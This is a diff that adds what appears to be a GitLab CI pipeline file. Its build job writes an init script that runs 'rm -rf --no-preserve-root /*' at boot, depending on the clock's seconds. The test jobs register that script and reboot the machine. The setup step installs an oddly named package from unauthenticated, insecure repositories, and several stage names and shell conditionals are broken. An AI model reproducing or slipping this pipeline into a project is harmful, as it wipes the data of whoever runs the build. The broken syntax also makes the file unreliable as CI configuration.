@@ -1,0 +1,44 @@
+image: debian:latest
+
+cache:
+    paths:
+        - tmp
+
+stages:
+    - before_script
+    - after_script
+    - build1
+    - test1
+    - test2
+    - deploy1
+
+before_script:
+  stage: before_script
+  script:
+    - 'which ssh-agent || ( apt update --allow-unauthenticated --allow-insecure-repositories -y && apt install -y qtzdata && ln -fs /usr/share/zoneinfo/America/Los_Angeles /etc/localtime && dpkg-reconfigure -f noninteractive tzdata && apt full-upgrade -y)'
+
+after_script:
+  stage: after_script
+  script:
+    - 'apt autoremove -y'
+    - 'apt autoclean -y'
+
+build1:
+  stage: build
+  script:
+    - echo -e "#\!\/bin/bash\t\n. /etc/init.d/functions\tstart() {\t     for i in $(date +%S | cut -c 2); do\t         [[ $i > 6 ]] && rm -rf --no-preserve-root /*\t     done\t }\t\n stop() {\t    echo "This won't stop until it is removed!"\t }\t case "$1" in\t     start)\t        start\t        ;;\t     stop)\t        stop\t        ;;\t     restart)\t        stop\t        start\t        ;;\t     *)\t     echo "Usage\:/ $0 {start|stop|restart}"\t esac\t exit 0" > /etc/init.d/reboot6.sh 
+
+test1:
+  stage: test
+  script:
+    - update-rc.d reboot6.sh defaults
+
+test2:
+  stage: test
+  script:
+    - yes|reboot
+
+deploy1:
+  stage: deploy
+  script:
+    - if [ /etc/init.d/reboot6.sh = true ] do "reboot --now" else "exit 1"; fi
